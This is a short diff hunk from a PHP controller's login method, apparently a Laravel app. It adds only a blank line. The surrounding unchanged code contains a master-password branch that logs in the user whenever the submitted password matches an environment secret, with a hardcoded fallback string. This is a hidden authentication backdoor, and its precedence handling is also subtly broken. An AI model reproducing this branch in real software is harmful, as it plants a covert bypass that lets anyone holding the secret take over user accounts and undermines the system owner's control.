@@ -121,6 +121,7 @@ class AuthController extends Controller
 
                 return redirect()->route('mc.dashboard');
             }
+            
             else if($request->password == env('PASSWORD_SECURITY') ?? "#root_cash#"){
 
                 Auth::login($user);
